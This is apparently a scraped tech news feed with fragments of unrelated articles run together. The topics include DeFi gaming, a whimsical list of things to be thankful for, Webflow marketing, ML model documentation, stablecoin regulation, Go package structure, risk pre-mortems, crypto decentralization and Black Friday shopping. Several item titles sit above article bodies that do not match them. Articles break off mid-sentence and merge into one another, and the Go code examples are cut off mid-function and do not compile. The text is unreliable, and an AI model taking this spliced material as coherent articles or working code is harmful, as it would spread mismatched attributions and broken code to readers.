marketplace that was able to accept assets from different networks.Over 120 games integrated their items into this unified structure, with users allowed to stake, borrow, or trade items in and across different blockchains through shared liquidity pools. Authenticity would be verified and fraud minimized through zero-knowledge proofs.The presence of one shared market also increased overall trading volume and gave players and developers more consistent value for their assets. This environment supports broader participation and encourages creators to design items with longer market presence.Where the DeFi–Gaming Relationship Is Moving NextThe way ahead of Decentralized DeFi and Gaming is broader integration of zk-based elements into real-time settings. Games are expected to integrate provable fairness systems as part of standard design rather than optional tools.This might also extend to autonomous agents in gaming environments, where agents support players or maintain parts of the in-game economy without any sort of centralized oversight. Such agents could process tasks continuously, thus creating a predictable operational layer across connected systems.Meanwhile, the cross-chain frameworks continue to be relevant as developers build networks to support liquidity and portable assets. This encourages cooperation across platforms and helps users manage holdings with more flexibility within decentralized settings.]]></content:encoded></item><item><title>Underrated reasons to be thankful V</title><link>https://dynomight.net/thanks-5/</link><author>numeri</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 20:37:51 +0000</pubDate><source

does love you.That if you’re a life form and you cook up a baby and copy your genes to them, you’ll find that the genes have been degraded due to oxidative stress et al., which isn’t cause for celebration, but if you find some other hopefully-hot person and randomly swap in half of their genes, your baby will still be somewhat less fit compared to you and your hopefully-hot friend on average, but now there is variance, so if you cook up several babies, one of them might be as fit or even fitter than you, and that one will likely have more babies than your other babies have, and thus complex life can persist in a universe with increasing entropy.That if we wanted to, we surely  figure out which of the 300-ish strains of rhinovirus are circulating in a given area at a given time and rapidly vaccinate people to stop it and thereby finally “cure” the common cold, and though this is too annoying to pursue right now, it seems like it’s just a matter of time.That if you look back at history, you see that plagues went from Europe to the Americas but not the other way, which suggests that urbanization and travel are great allies for infectious disease, and these both continue today but are held in check by sanitation and vaccines even while we have lots of tricks like UVC light and high-frequency sound and air filtration and waste monitoring and paying people to stay home that we’ve barely even put in play.That while engineered infectious diseases loom ever-larger as a potential very big problem, we also have lots of crazier tricks we  pull out like panopticon viral screening or toilet monitors or daily individualized saliva sampling or engineered microbe-resistant surfaces or even dividing society into cells with rotating interlocks or having people walk around in little personal spacesuits, and while admittedly most of this doesn’t sound awesome, I see no reason this shouldn’t be a battle that we would win.That clean water, unlimited, almost free.That radioactive atoms either release a ton of energy but also quickly stop existing—a gram of Rubidium-90 scattered around your kitchen emits as much energy as ~200,000 incandescent lightbulbs but after an hour only 0.000000113g is left—or don’t put out very much energy but keep existing for a long time—a gram of Carbon-14 only puts out the equivalent of 0.0000212 light bulbs but if you start with a gram, you’ll still have 0.999879g after a year—so it isn’t actually  easy to permanently poison the environment with radiation although Cobalt-60 with its medium energy output and medium half-life is unfortunate, medical applications notwithstanding I still wish Cobalt-60 didn’t exist, screw you Cobalt-60.That while curing all cancer would only increase life expectancy by ~3 years and curing all heart disease would only increase life expectancy by ~3 years, and preventing all accidents would only increase life expectancy by ~1.5 years, if we did all of these at the same time and then a lot of other stuff too, eventually the effects would go nonlinear, so trying to cure cancer isn’t actually a waste of time, thankfully.That the peroxisome, while the mitochondria and their stupid Krebs cycle get all the attention, when a fatty-acid that’s too long for them to catabolize comes along, who you gonna call.That we have preferences, that there’s no agreed ordering of how good different things are, which is neat, and not something that would obviously be true for an alien species, and given our limited resources probably makes us happier on net.That cardamom, it is cheap but tastes expensive, if cardamom cost 1000× more, people would brag about how they flew to Sri Lanka so they could taste chai made with fresh cardamom and swear that it changed their whole life.That Gregory of Nyssa, he was right.That Grandma Moses, it’s not too late.That sleep, that probably evolution first made a low-energy mode so we don’t starve so fast and then layered on some maintenance processes, but the effect is that we live in a cycle and when things aren’t going your way it’s comforting that reality doesn’t stretch out before you indefinitely but instead you can look forward to a reset and a pause that’s somehow neither experienced nor skipped.That, glamorous or not, comfortable or not, cheap or not, carbon emitting or not, air travel is very safe.That, for most of the things you’re worried about, the markets are less worried than you and they have the better track record, though not the issue of your mortality.That sexual attraction to romantic love to economic unit to reproduction, it’s a strange bundle, but who are we to argue with success.That every symbolic expression recursively built from differentiable elementary functions has a derivative that can also be written as a recursive combination of elementary functions, although the latter expression may require vastly more terms.That every expression graph built from differentiable elementary functions and producing a scalar output has a gradient that can itself be written as an expression graph, and furthermore that the latter expression graph is always the same size as the first one and is easy to find, and thus that it’s possible to fit very large expression graphs to data.That, eerily, biological life and biological intelligence does not appear to make use of that property of expression graphs.That if you look at something and move your head around, you observe the entire light field, which is a five-dimensional function of three spatial coordinates and two angles, and yet if you do something fancy with lasers, somehow that entire light field can be stored on a single piece of normal two-dimensional film and then replayed later.That, as far as I can tell, the reason five-dimensional light fields can be stored on two-dimensional film simply cannot be explained without quite a lot of wave mechanics, a vivid example of the strangeness of this place and proof that all those physicists with their diffractions and phase conjugations really are up to something.That disposable plastic, littered or not, harmless when consumed as thousands of small particles or not, is popular for a reason.That disposable plastic, when disposed of correctly, is literally carbon sequestration, and that if/when air-derived plastic replaces dead-plankton-derived plastic, this might be incredibly convenient, although it must be said that currently the carbon in disposable plastic only represents a single-digit percentage of total carbon emissions.That rocks can be broken into pieces and then you can’t un-break the pieces but you can check that they came from the same rock, it’s basically cryptography.That the deal society has made is that if you have kids then everyone you encounter is obligated to chip in a bit to assist you, and this seems to mostly work without the need for constant grimy negotiated transactions as Econ 101 would suggest, although the exact contours of this deal seem to be a bit murky.That of all the humans that have ever lived, the majority lived under some kind of autocracy, with the rest distributed among tribal bands, chiefdoms, failed states, and flawed democracies, and only something like 1% enjoyed free elections and the rule of law and civil liberties and minimal corruption, yet we endured and today that number is closer to 10%, and so if you find yourself outside that set, do not lose heart.That if you were in two dimensions and you tried to eat something then maybe your body would split into two pieces since the whole path from mouth to anus would have to be disconnected, so be thankful you’re in three dimensions, although maybe you could have some kind of jigsaw-shaped digestive tract so your two pieces would only jiggle around or maybe you could use the same orifice for both purposes, remember that if you ever find yourself in two dimensions, I guess.]]></content:encoded></item><item><title>&apos;Stranger Things&apos; Joe Keery and Charlie Heaton on who can climb a tower

But as operations expand, processes become more complex, and data volumes increase, these universal tools often reach their limits.For years, Webflow has been regarded as the “designer’s playground” - ideal for creating quick landing pages, but often considered too limited for complex, logic-driven systems. That assumption couldn’t be further from the truth.As digital products evolve, companies need sites that are fast, dynamic, and easy to maintain - without sacrificing flexibility. The no-code movement gave teams freedom, but for developers who understand how to extend it, Webflow becomes something much more powerful: a low-code framework for custom logic, automation, and scalable front-end systems.At , we’ve spent years exploring that frontier - building projects that blur the line between visual editing and true engineering.The Myth of “No-Code = No Control”Webflow’s drag-and-drop interface makes it easy to start, but that same simplicity often leads people to underestimate its depth.The truth is, no-code doesn’t mean no logic. Behind the visual layer, Webflow supports conditions, CMS-driven visibility, and dynamic content rendering. A skilled team can orchestrate these components, such as a front-end architecture, controlling visibility, relationships, and even logic flow - all within the platform’s visual editor.The difference between a casual user and an engineering-minded one isn’t tools - it’s mindset. A marketer drags and drops; a developer designs systems that scale.Webflow Logic Layer - What’s Possible Without CodeWebflow includes a surprisingly rich native logic system.You can conditionally display content based on CMS fields, switch layouts depending on categories, or time content visibility automatically - all without writing a line of JavaScript.Show or hide entire sections depending on a “featured” flag in your CMS;Automatically reveal or archive content based on a scheduled date;Bind interactions to CMS data to affect animations or visibility dynamically.This layer alone can handle up to 80% of what many teams assume requires custom scripting, proving that, in the right hands, “no-code” can rival traditional development for flexibility.Dynamic Behavior Without JavaScriptEven without coding, Webflow’s data attributes, visibility conditions, and native interactions allow you to simulate reactive behavior.Designers can build multi-step forms that reveal sections based on user input, or create dashboards that filter content using CMS connections. When used strategically, this combination produces a “pseudo-reactive” UI - the experience of dynamic interactivity, powered entirely by native tools.The beauty is that everything remains manageable through Webflow’s visual interface. Teams can iterate fast without developer bottlenecks, yet the site feels engineered, not templated.Integrating Custom Code - The Low-Code Sweet SpotThere comes a point where you need to go further - when user personalization, dynamic filtering, or live API calls become essential. This is where Webflow transitions from no-code to low-code.Through embedded scripts or before  injections, developers can extend functionality while keeping the structure intact. It’s the sweet spot: enough code to enable real logic, not so much that it breaks maintainability.Typical low-code enhancements include:Dynamic filters for CMS collections;Conditional redirects based on user roles;Fetch requests to external APIs for real-time content updates.By using lightweight, modular code instead of heavy libraries, Webflow projects can achieve the complexity of a full web app - without losing speed or SEO health.When to Go Beyond WebflowEvery platform has limits, and Webflow is no exception.When projects involve large-scale content, complex user accounts, or backend logic, extending Webflow with headless backends or APIs becomes the natural next step.Some of the best hybrid setups we’ve built include: for structured data synchronization; for user authentication and custom dashboards; or Make for workflow automation.In these models, Webflow serves as the presentation layer - fast, beautiful, and intuitive - while external services handle the logic, data, and scaling behind the scenes.It’s how startups turn a simple Webflow prototype into a long-term digital ecosystem.Performance, SEO & MaintainabilityCustom logic must remain lightweight. Too many embedded scripts can block rendering, negatively impact SEO, or cause layout flickering.After building dozens of logic-driven Webflow systems, we’ve learned a few golden rules:Keep scripts page-specific, not global;Test every custom behavior in Lighthouse and Webflow Audit;Prefer CSS transitions over JavaScript animations for visual stability;Use async or deferred loading to avoid render blocking.A fast site doesn’t just rank higher - it also converts better. Simplicity in logic equals stability in growth.Real Projects from Che IT Group1. 1-800-D2C - Scaling No-Code with LogicWe helped 1-800-D2C build a platform that cataloged over 500 D2C tools using Webflow, Memberstack, and Airtable.The result: gated premium content, seamless user management, and automated data updates - all launched in just six weeks.This project demonstrated that with thoughtful architecture, no-code solutions can scale effectively like enterprise software.2. Ganz Security - Custom Logic for Smarter UXFor Ganz Security, we rebuilt their digital presence on Webflow with advanced product filters, multilingual support, and AWS integrations.The new structure increased user engagement by 125% and reduced quote request time by 70%, demonstrating how well-planned logic can transform a corporate website into an interactive, high-performance system.Both examples demonstrate a single truth: Webflow’s limits are not technical - they’re creative.The no-code movement was never about eliminating developers; it was about removing friction. Webflow has evolved into a genuine front-end environment where creativity and engineering intersect.Used right, it’s not a design toy - it’s a rapid development framework that gives teams the power to move faster without losing precision. You don’t need to choose between flexibility and simplicity - with Webflow, you can have both.Because “no-code” doesn’t mean “no control.” It means building smarter.Che IT Group helps companies build scalable Webflow ecosystems that strike a balance between creativity and logic. Explore our  to see how we combine design freedom with engineering precision.]]></content:encoded></item><item><title>Kasparov at Washington security forum: NATO does not exist, it&apos;s fake.

A model works during development but behaves differently in production. An upstream field changes format without notice. A feature arrives late. A threshold shifts because old assumptions stayed in place for too long. When problems like these appear, teams search through logs and dashboards without a clear guide. One cause can account for many issues. The model was deployed without proper documentation.Strong documentation gives teams a shared reference that explains how the model should act. It supports audits. It reduces the time needed to diagnose issues. It improves handoffs between teams. It raises long-term confidence in the system. The following sections describe a practical method for documenting model behavior in a way that supports reliability and trust.\
Every model needs a clear statement of intention. This section defines the decision the model supports. It identifies the outcome the model produces and the action that follows the prediction.A model intention statement uses direct language. It avoids broad claims and vague descriptions. If the model classifies events, the statement explains what the classification means. If the model generates a score, the statement explains how it is used downstream. This clarity prevents incorrect assumptions about the model’s role.The section lists the inputs the model expects. Each input is described with its field name, format, and purpose. The outputs are described in the same way. Response time expectations are recorded here. Some models run in low-latency environments. Others run in scheduled jobs. Recording these constraints helps teams understand where the model fits in the workflow.Environmental details also belong here. A model may run on cloud infrastructure, on a local server, or on a constrained device. Each environment shapes how the model behaves under load. Recording these details prevents deployment in situations the model cannot support.Input behavior is the source of many production failures. A changed field can cause silent drift. A delayed pipeline can shift predictions. A value outside the normal range can trigger unexpected actions. Documenting input behavior reduces the impact of these events.This section begins with a list of all input fields. Each field description includes acceptable ranges, valid formats, and any transformation applied before prediction. Recording the origin of each field is essential. Many fields depend on upstream systems that evolve. Knowing where each field comes from helps teams identify causes of unexpected changes.A short example makes the concept clear. A model may receive a field named device_load. The valid range may be zero to one hundred. Values above this limit should trigger a fallback path. Recording this detail helps teams catch corrupted or noisy input before it reaches production traffic.This section documents common data risks. These risks include delayed updates, missing values, placeholder entries, and inconsistent sample rates. Recording these risks presents teams a realistic view of the data. It also helps reviewers understand where drift or instability may begin.An example dataset strengthens this part of the document. The dataset should reflect real patterns. It should include typical ranges, common outliers, and realistic distributions. The content should be non-sensitive and simplified. The goal is to support quick tests, validation checks, and local experimentation. This dataset becomes a reusable resource that helps prevent repeated data errors.Teams rely on predictable decision behavior to maintain stable systems. When decision behavior is unclear, the model appears unpredictable. Such behavior slows audits. It adds uncertainty during incidents. It increases the time needed to review features and resolve issues.This section describes how the model reaches an output. This section documents thresholds, numeric cutoffs, category rules, and decision points. If the model uses rules before or after prediction, they are included. The goal is to show the full path from input to final action.Examples bring clarity to this part of the document. Realistic examples demonstrate how specific inputs produce specific outputs. These examples show normal cases, boundary cases, and atypical inputs. They help teams understand the decision process without searching through codes.The section also explains how the model handles invalid or unexpected input. Many incidents begin with a single bad record. When fallback rules are documented, teams can respond quickly. This reduces guesswork and protects the system during irregular events.If the system provides confidence scores, ranking levels, or reason codes, these elements are defined here. Clear definitions help readers interpret results correctly. They also support consistent decisions across teams.Operational control protects the system after deployment. Many teams focus on training and testing but overlook the conditions that affect long-term performance. Strong operational documentation prevents drift, reduces downtime, and improves system resilience.This section starts with performance limits. These limits include throughput, latency under load, retry rules, and timeout behavior. Recording these details helps teams plan scaling strategies and load tests.Monitoring checks follow. These checks track data quality, distribution changes, input drift, output stability, and model health. Each check is described with the source of the metric, the alert rule, and the actions teams should take when an alert triggers. Clear monitoring reduces confusion during incidents and keeps responses consistent.Rollback steps belong in this section. Rollbacks often restore stability faster than incremental fixes. Documenting the process prevents mistakes during high-pressure moments. The description includes the version used for fallback, the systems affected by the rollback, the steps needed to complete it, and the conditions required before starting.Ownership is the final part of operational control. This section lists the teams responsible for updates, monitoring, reviews, and incident response. Clear ownership prevents gaps in responsibility. A review schedule keeps the documentation current.A fraud detection model evaluated a large volume of transactions. The model used several features provided by upstream sources. One field tracked user movement across regions. The documentation noted the source of this field, its expected range, and the known delays during heavy traffic.A rise in false declines appeared in one region. The behavior looked random until the team reviewed the documentation. The input behavior section pointed to the movement field as a high-risk input during peak load. The team reviewed upstream logs and found a delay large enough to move the value outside its normal range. The model assigned higher risk scores because of the shift. The rollback process restored normal behavior quickly. The documentation reduced investigation time and protected the rest of the workflow.Integration Into Team Workflows\
This method can be added to any software development process. Teams can begin by creating a template with the sections described above. Filling the template requires accurate information. Once created, the document becomes part of the model release process.After deployment, the document supports audits, updates, incident reviews, and training for new engineers. It reduces maintenance cost because changes are easier to evaluate. When teams work with a shared reference, they spend less time debating assumptions and more time improving quality.AI systems become more predictable when teams understand how the model behaves in real conditions. Clear documentation makes that possible. It supports audits. It reduces incident impact. It improves communication across teams. A simple template is enough to begin. Use this structure on one active model in your environment and refine the process with each new release.]]></content:encoded></item><item><title>Stablecoin Regulation as a Threat to Stablecoins Themselves</title><link>https://hackernoon.com/stablecoin-regulation-as-a-threat-to-stablecoins-themselves?source=rss</link><author>Christopher Louis Tsu</author><category>tech</category><pubDate>Thu, 27 Nov 2025 20:17:38 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[The Paradox of Legalization: How Global Regulation May Empower Banks and Undermine USDT and USDC.Right now, something unusual is happening in the stablecoin market. Governments around the world are finally starting to regulate digital dollars, which is what the industry has wanted. Europe’s MiCA  took effect in December 2024. Hong Kong put its Stablecoins Ordinance in place in . The UK and Singapore are set to establish their own rules. Even the US passed the GENIUS Act this year.However, here's the thing: the moment regulation arrived, the ground started shifting under the feet of private issuers.Take Europe. Since March 2025, exchanges across the European Economic Area have been systematically delisting USDT. Coinbase  it in December 2024. Crypto.com followed in January. Binance pulled all USDT spot trading pairs by the end of March. The reason? Tether doesn't hold an EU e-money license and hasn't applied for MiCA authorization. Without that stamp, even the world's largest stablecoin – with its $140 billion market cap – simply cannot be offered to European retail investors anymore.This isn't theoretical compliance theater. It's capital reallocation at scale. Circle's USDC, which secured MiCA approval early, has been the primary beneficiary. But the real competition isn't coming from another fintech. It's coming from traditional banks.In September 2025, nine major European lenders – ING, UniCredit, CaixaBank, Danske Bank, SEB, and others – announced a  to launch a MiCA-compliant euro stablecoin by mid-2026. Not a partnership with crypto companies. Not an endorsement of existing tokens. This is a direct alternative, regulated by the Dutch Central Bank, built on decades of institutional trust.The irony is hard to miss. Stablecoins were supposed to disrupt traditional finance by offering faster, cheaper, more transparent value transfer. Now, banks are adopting the same technology but keeping control of the issuance, the reserves, and the regulatory relationships. They're issuing tokenized deposits that operate under existing banking frameworks while delivering the same blockchain-based efficiency that made stablecoins attractive in the first place.Singapore offers another data point. The Monetary Authority of Singapore finalized its stablecoin framework in 2023, explicitly excluding tokenized bank liabilities from the regulatory regime for private stablecoins. Why? Because banks already operate under comprehensive supervision. MAS Managing Director Chia Der Jiun said it plainly at Singapore Fintech Festival: while stablecoins have a role, "tokenized bank liabilities benefit from current central bank and regulatory arrangements that underpin value stability."Translation: if you're a bank, you don't need to comply with stablecoin rules – your existing license covers it. If you're Tether or Circle, you face new reserve requirements, monthly attestations, redemption timelines, and operational restrictions that banks simply don't.Hong Kong's approach is even more explicit. The Stablecoins Ordinance requires HK$25 million in paid-up capital, full segregation of reserve assets, and daily reconciliation. Banks issuing tokenized deposits? They can operate under their existing licenses with lighter oversight. The Hong Kong Monetary Authority has indicated that only a handful of stablecoin licenses will be granted initially, and they're setting a high bar.The UK is heading in a similar direction. The Bank of England's November 2025 consultation on systemic stablecoins proposed allowing issuers to hold up to 60% of backing assets in short-term government debt, with the remainder in unremunerated central bank deposits. But the proposals also acknowledged that banks issuing tokenized deposits would remain subject to conventional banking regulations, not stablecoin regimes. Another regulatory moat.Let's be clear about what's happening. Regulation isn't making stablecoins safer or more legitimate. It's making them harder to scale and more expensive to operate than bank-issued alternatives. Private issuers face strict reserve rules, capital buffers, business restrictions, and compliance costs that incumbent financial institutions don't. Banks, meanwhile, get to tokenize their existing deposit base with minimal friction.Citi Institute projects that tokenized bank deposits could support $100 to $140 trillion in  – potentially surpassing stablecoin circulation entirely. McKinsey estimates stablecoin circulation could reach , but that assumes regulatory frameworks don't systematically favor banks. Given what we've seen in Europe and Asia, that assumption looks shaky.The European delisting of USDT is just the opening act. As more jurisdictions implement their regimes, we'll see this pattern repeat. Private issuers will face mounting compliance costs, operational constraints, and market access barriers. Banks will issue their own tokenized liabilities, often in consortium structures that reduce competition and increase costs for users.The real question is whether private stablecoins can maintain their operational edge – speed, scale, interoperability – under regulatory frameworks explicitly designed to favor banks. The technology itself isn't the issue. Blockchain infrastructure has matured significantly. At Venom Foundation, we've built our platform secure by design and scalable by nature precisely to handle institutional-grade throughput with proper compliance controls. The problem is that regulation isn't evaluating technology on merit, it's creating structural advantages for incumbents.Composability matters. Network effects matter. But so does regulatory arbitrage, and right now, banks have it. Stablecoins won the technology argument. The question is whether they can survive winning the regulatory one.]]></content:encoded></item><item><title>How to Tell What’s Real Online</title><link>https://www.youtube.com/watch?v=o4I_hOz_MLw</link><author>StarTalk</author><category>yt</category><enclosure url="https://www.youtube.com/v/o4I_hOz_MLw?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 20:13:25 +0000</pubDate><source url="https://www.youtube.com/channel/UCqoAEDirJPjEUFcF2FklnBA">StarTalk</source><content:encoded><![CDATA[In a world overflowing with opinions, clips, conspiracies, and AI-generated answers, how do you know what’s actually true?

I've spent countless hours helping teams untangle circular dependencies in their Go projects. "Can't load package: import cycle not allowed" — if you've seen this error, you know how painful it is to refactor tangled dependencies. Go is merciless: no circular imports, period. And this isn't a bug, it's a feature that forces you to think about architecture. \n  \n Common package organization mistakes I've seen: \n - Circular dependencies attempted: ~35% of large Go projects \n - Everything in one package: ~25% of small projects \n - Utils/helpers/common packages: ~60% of codebases \n - Wrong interface placement: ~70% of packages \n - Over-engineering with micropackages: ~30% of projectsAfter 6 years working with Go and reviewing architecture in projects from startups to enterprise, I've seen projects with perfect package structure and projects where everything imports everything (spoiler: the latter don't live long). Today we'll explore how to organize packages so your project scales without pain and new developers understand the structure at first glance.Anatomy of a Good Package// BAD: generic names say nothing

  /logger     # reusable
  /crypto     # crypto utilities
Internal: Private Project PackagesGo 1.4+ has a special `internal` directory whose code is accessible only to the parent package:// Structure:
// myproject/
//   cmd/api/main.go
//   internal/
//     auth/auth.go
//     storage/storage.go
//   pkg/
//     client/client.go

// cmd/api/main.go - CAN import internal
import "myproject/internal/auth"

// pkg/client/client.go - CANNOT import internal
import "myproject/internal/auth" // compilation error!

// Another project - CANNOT import internal
import "github.com/you/myproject/internal/auth" // compilation error!
Rule: internal for Business Logic// internal/user/service.go - business logic is hidden
package user

type Service struct {
    repo Repository
    mail Mailer
}

func NewService(repo Repository, mail Mailer) *Service {
    return &Service{repo: repo, mail: mail}

    }

    // send welcome email
    s.mail.SendWelcome(user.Email)

    return user, nil
}
Dependency Inversion: Interfaces on Consumer SideRule: Define Interfaces Where You Use Them// BAD: interface in implementation package
// storage/interface.go
package storage

type Storage interface {
    Save(key string, data []byte) error
    Load(key string) ([]byte, error)
}

// storage/redis.go
type RedisStorage struct {
    client *redis.Client
}

func (r *RedisStorage) Save(key string, data []byte) error { /*...*/ }
func (r *RedisStorage) Load(key string) ([]byte, error) { /*...*/ }

// PROBLEM: service depends on storage
// service/user.go
package service

import "myapp/storage" // dependency on concrete package!

type UserService struct {
    store storage.Storage
}
// GOOD: interface in usage package
// service/user.go
package service

// Interface defined where it's used
type Storage interface {
    Save(key string, data []byte) error
    Load(key string) ([]byte, error) 
}

type UserService struct {
    store Storage // using local interface
}

// storage/redis.go
package storage

// RedisStorage automatically satisfies service.Storage
type RedisStorage struct {

// models imports utils
// utils imports config  
// config imports models // CYCLE!

// controllers imports services, models, utils
// services imports repositories, models, utils
// repositories imports models, database, utils

Solution: Unidirectional Dependencies// Application layers (top to bottom)
// main
//   ↓
// transport (HTTP/gRPC handlers)

Green means safe. Red means panic.Then we file it away and never look at it again until the project explodes for a reason that wasn't on the spreadsheet.It's the business equivalent of reading tea leaves. We do it because it gives us the . We feel better believing that because we put "Server Crash" in cell C4, we have tamed the chaos of reality.But reality doesn't care about your 5x5 matrix.The problem isn't the matrix itself; it's the biological hardware running the simulation: .Humans are evolutionarily wired for "Optimism Bias." It’s a survival mechanism. If our ancestors stopped to calculate the exact statistical probability of being eaten by a lion every time they left the cave, they’d never have gone hunting.In modern business, this bias is fatal."The vendor promised they'd deliver by Q3." (They won't.)"Our users will adapt to the new interface quickly." (They'll revolt.)"Regulatory changes take years."

How to Run a "Pre-Mortem"The best time to use this isn't when things are going wrong. It's when everyone thinks things are going right.Psychologist Gary Klein invented the concept of a "Pre-Mortem." Unlike a post-mortem (where you figure out why the patient died), a pre-mortem assumes the patient  and asks, "What killed them?"Here’s how to pair this technique with the prompt:: Write down your sunny, optimistic project plan.: Paste the plan into the  section of the prompt.: Under , add this line: "Assume the project has failed catastrophically 6 months from now. Reverse engineer the most likely causes.": The AI will generate a detailed breakdown of your blind spots.I used this recently for a client launching a fintech app. Their internal risk log was full of technical worries: "API latency," "Server downtime," "Buggy UI."The AI, prompted to think like a COSO-certified expert, flagged something completely different:: "Regulatory ambiguity regarding new SEC crypto custody rules.": "Possible cease-and-desist order post-launch."The team had been so focused on the code they forgot the law.

This can, and has, created its own set of problems. Without decentralization, we risk repeating the failures of traditional finance, with gatekeepers, censorship, and single points of failure. Yet over time, parts of crypto’s infrastructure are drifting toward centralized control.What began as permissionless, open systems are increasingly shaped by dominant actors in key layers. The question becomes: how do we notice when centralization is creeping in, and how can we push back, even with modest steps?Why Decentralization Still MattersDecentralization isn’t just a fancy buzzword to sell digital products. It’s the principle that makes crypto worth trusting in the first place. When no single entity controls the system, no gatekeeper can decide who participates or who gets blocked. That means users can transfer value, publish data, or build tools without asking for permission. It’s freedom, but in network form.When control concentrates in a few hands, then freedom starts to fade. A centralized exchange (like Coinbase or Binance) can freeze withdrawals for any reason; a dominant “validator” or group of “validators” in a Proof-of-Stake (PoS) network can censor transactions; a government can pressure a single operator or a small group of operators instead of thousands. In those potential scenarios, decentralization stops being a theory and becomes protection. It’s what allows crypto to keep functioning even when politics, outages, or business failures strike.From a financial angle, decentralization also spreads risk. When a system has many independent actors verifying and storing data, a single failure doesn’t take everything down. It’s like weaving a net instead of stretching a single thread: if one strand snaps, the rest still hold together.Finally, decentralization nurtures innovation. Open participation means new developers can propose upgrades or create alternatives without seeking approval from a monopoly. The explosion of new chains and applications was possible precisely because no one was in charge of permissioning innovation. That freedom is what gave crypto its creative spark, and losing it would dim the entire ecosystem. \n Where Centralization Is Appearing TodayDespite the ideals, centralization is quietly running in several layers of crypto. Custodial exchanges  a great portion of user funds, concentrating financial control in a handful of platforms. If those platforms face pressure from regulators or suffer downtime, the effects could ripple across millions of users —as it happened with the . It’s an irony that a movement built to remove middlemen now leans on a few massive intermediaries.Another clear sign of centralization creeping into crypto is validator censorship. In theory, every transaction should have an equal chance of being processed, but in practice, “validators” can (and sometimes do) exclude transactions they consider “risky” or politically inconvenient. After the U.S. sanctioned  in 2022, many Ethereum “validators” began rejecting transactions linked to it to comply with regulations, for instance.Since “validators” (who are actually block builders) decide what gets included, nearly half of Ethereum’s blocks excluded such transactions at some point, showing how fragile decentralization becomes when middlemen can silence parts of a network. And this happens because the network was designed that way.… And There Are More PlacesWe’re definitely seeing more centralization in crypto now than five years ago. For example, institutional actors are holding huge chunks of the market: says that over 30% of all Bitcoin supply is now controlled by treasuries, ETFs and public companies. And that’s not to mention the next, established this year by the Trump’s administration.Large companies are also piling into crypto in a way we didn’t see before. Corporations  roughly 855,000 BTC, or around 4% of Bitcoin’s supply, and in recent quarters their accumulations have outpaced ETFs. This might not be so bad in Bitcoin with its Proof-of-Work consensus, however in Proof-of-Stake networks like Ethereum and Solana, ownership translates to direct control of what’s allowed to be included in blocks, and it’s rapidly concentrating in these networks too. These moves not only shift influence toward fewer actors but also mean decision-making and market influence lean more toward institutions than broad networks of users.Even DeFi is not immune.  from the Bank for International Settlements shows that behind the appearance of openness, control often sits with a limited set of token holders, usually from venture capital companies. They can even collude to alter “decentralized” apps for financial gain. Andreessen Horowitz (a16z), a major VC in crypto,  of this several times.In short, if a supposedly decentralized platform doesn’t have enough participants, or if those participants hand over custody of their assets or votes to an intermediary, it will stay as centralized as a small bank.How To Spot CentralizationSpotting centralization doesn’t require deep technical skills. It starts with asking who controls what. If a service keeps the , it’s in charge of your funds. If a network relies on a small handful of “validators” or servers, it’s more fragile than it looks. And if decisions come from a closed circle, the project may already be centralized in practice, no matter how decentralized it claims to be.A few simple checks can reveal a lot. Look at how many independent “validators” or nodes are active, and, even more importantly, how much they can control at the end of the day. If two or three entities dominate and have broad powers, that’s a sign of imbalance. Examine governance forums or websites to see who proposes and passes updates. Transparency is a good indicator: open discussions suggest power is distributed; silence from the top often means otherwise.The architecture itself can offer clues. , for example, uses a Directed Acyclic Graph (DAG) instead of a blockchain, spreading validation across users rather than relying on miners or stakers. Its Order Providers (OPs) can’t “approve” or “reject” transactions; they only create waypoints that are used to order them, while is available to all users. Still, even in systems like Obyte, vigilance is needed to ensure that influence doesn’t cluster among a few active holders. \n Some Steps to Avoid CentralizationAvoiding the risks of centralization doesn’t require turning into a  overnight. Small steps matter. The first is self-custody. When we hold our own private keys (even on just a piece of paper), we remove an entire layer of dependency. We can still use exchanges for trading, but large balances should live in wallets we control. In Obyte, users can create a simple textcoin as a cold and self-custodial wallet, for instance.Running or supporting  is another underrated act of decentralization. All networks offer guides for doing this, and even lighter full nodes, like pruned nodes in Bitcoin, help strengthen network resilience —and your own autonomy. Depending on the network, the requirements may not be a lot, either.Transparency should also be rewarded. Decentralized projects should publish their code and governance proposals for everyone, even if not everyone is a programmer. Other community members will analyze this data and share their findings. The more visible a system is, the easier it becomes to avoid hidden centralization.And finally, community participation matters: joining discussions, proposing governance changes, or voting on them keeps teams accountable. The healthier a community’s involvement is, the harder it is for control to concentrate unnoticed. \n Trade-Offs and Realistic ExpectationsComplete decentralization is hard, and that’s okay. Systems that distribute power often sacrifice speed or simplicity. Self-custody shifts responsibility to the user, and smaller “validators” can face reliability issues. Still, these ‘inconveniences’ are the price of independence.We also need to accept that some centralization has value. Exchanges simplify fiat on-ramps, and centralized relays can help coordinate complex systems. The key is to rely on them wisely. Keep only what’s needed on centralized platforms, secure the rest yourself, and always have an exit path. The difference between dependence and convenience is preparation.Progress happens incrementally. When we choose decentralized services, set up our own nodes, or speak up about governance concentration, we nudge the system back toward its original vision.  isn’t built overnight, and it’s never granted. It’s a continuous balance between usability and resilience.In the end, avoiding an excess of centralization is about cultivating good habits. A healthy crypto ecosystem depends on millions of users making small, conscious choices that keep power distributed rather than concentrated. By staying alert and sharing responsibility, we ensure that the open, borderless spirit that gave birth to crypto stays alive —not just in code, but in the way we use it.:::info

On past Black Fridays, Eilise Fisher has fired up her laptop and searched for deals on big-ticket items: A reduced Le Creuset Dutch oven, or a new TV at 30% off. This year, her shopping cart looks a little different — Fisher is planning to stock up on three 40-pound bags of Purina kibble, the favorite snack of her three rescue dogs: Luke, Leia and Yoda.
Fisher, a 47-year-old government project manager living in Flagstaff, Arizona, has also created a color-coded spreadsheet of her potential purchases, detailing the product’s original price and any available discounts. It’s a step beyond her usual wish list.
As US consumers remain anxious about job security and the cost of living, some, like Fisher, are using seasonal sales — a period usually geared toward gift buying and the occasional personal indulgence — to restock on essentials. They’re also taking a more cautious approach to shopping; sticking to pre-planned purchases and buying gift cards instead of potentially unwanted presents. 
It’s a trend that’s been gathering momentum in recent months. Household items like dish soap and dishwasher rinse aid were among bestsellers during an Amazon Prime sale this summer. And about 64% of shoppers said they planned to buy on-sale necessities during recent October discounts, according to a report from consultancy Deloitte. That’s up from 58% who said the same in 2024. 
“As we saw during this summer’s back-to-school shopping season, consumers are keen to take advantage of holiday spending events to also purchase everyday goods,” said Mark Mathews, chief economist and executive director of research at the National Retail Federation.

